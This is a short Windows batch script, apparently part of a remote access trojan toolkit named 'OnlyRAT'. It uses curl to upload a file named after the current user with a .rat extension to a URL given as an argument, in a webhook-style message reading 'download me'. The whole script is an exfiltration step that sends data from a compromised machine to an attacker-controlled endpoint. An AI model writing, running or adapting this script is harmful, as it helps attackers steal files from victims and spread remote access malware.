@echo off
set arg1=%1
shift

curl -F "payload_json={\"username\": \"OnlyRAT\", \"content\": \"download me\"}" -F "file=@%USERNAME%.rat" %arg1%
